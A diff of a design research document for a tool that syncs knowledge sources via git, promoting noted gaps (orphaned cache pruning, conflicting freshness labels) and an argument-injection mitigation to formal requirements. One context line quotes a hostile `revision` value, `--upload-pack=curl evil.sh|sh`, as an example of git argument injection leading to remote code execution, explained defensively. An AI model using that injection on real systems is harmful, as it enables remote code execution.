@@ -209,7 +209,8 @@ creating the hidden runtime dependency Constitution §I forbids?
 interpolated into a `git` command line by the executing agent. A `revision` of
 `--upload-pack=curl evil.sh|sh` passed to `git fetch` is remote code execution; a `path_filter`
 beginning with `-` is at minimum a git argument the user did not intend. Two mitigations are
-required together, because either alone is insufficient:
+required together — this is now stated normatively as **FR-034** — because either alone is
+insufficient:
 
 1. **Validate** — reject any value beginning with `-` before it is used.
 2. **Separate** — every `git` invocation that consumes a config value places `--` before it, so
@@ -284,11 +285,12 @@ at Tier-1 failure as an unresolvable revision rather than silently degrading.
 
 ## Gaps discovered during research
 
-Neither of these is covered by an existing Functional Requirement. Both are recorded here so
-`/speckit.tasks` produces work for them and `/speckit.analyze` can decide whether the spec
-should be amended.
+Neither was covered by a Functional Requirement when this document was written. Both have since
+been **promoted to requirements** in [spec.md](spec.md) after cross-artifact analysis. They are
+kept here in their original framing, because the reasoning that surfaced them is still the
+reasoning behind the requirement.
 
-### G1 — A revision change orphans the previous cache directory
+### G1 — A revision change orphans the previous cache directory → **FR-032**
 
 FR-003 purges the cache when a source is **removed**. But R2 makes the slug a function of the
 revision, so editing `revision` in place also strands the old directory — with no requirement
@@ -296,19 +298,19 @@ covering it. Over a few revision bumps a project accumulates dead cache trees th
 ever read or delete, which is the same "orphaned cache directories accumulate" outcome FR-003
 was written to prevent.
 
-**Proposed handling**: `sync` prunes cache directories that match the slug of **no** configured
-source. The prune set must be computed against *all* configured sources — enabled **and**
-disabled — because FR-004 requires a disabled source to keep its cache. Pruning runs after the
-per-source loop and reports each removal on its own line.
+**Required handling (FR-032)**: `sync` prunes cache directories that match the slug of **no**
+configured source. The prune set must be computed against *all* configured sources, enabled
+**and** disabled, because FR-004 requires a disabled source to keep its cache. Pruning runs after
+the per-source loop and reports each removal on its own line.
 
-### G2 — `status`'s 24-hour heuristic collides with `max_cache_age`
+### G2 — `status`'s 24-hour heuristic collides with `max_cache_age` → **FR-033**
 
 `speckit.knowledge.status.md` currently defines `fresh` as "synced_at is within the last 24h"
 and `cached` as older. Once `max_cache_age` exists, a source with `max_cache_age: 7d` synced
 three days ago is *fresh by policy* but *cached by the heuristic* — two contradictory labels for
 one state.
 
-**Proposed handling**: when a source has an effective `max_cache_age`, the policy determines the
-label. The 24-hour heuristic survives **only** as the default for sources with no policy, which
-is required by FR-024 for projects that upgrade and change nothing. `status` renders the
-threshold it used, so the label is never unexplained.
+**Required handling (FR-033)**: when a source has an effective `max_cache_age`, the policy
+determines the label. The 24-hour heuristic survives **only** as the default for sources with no
+policy, which is required by FR-024 for projects that upgrade and change nothing. `status`
+renders the threshold it used, so the label is never unexplained.
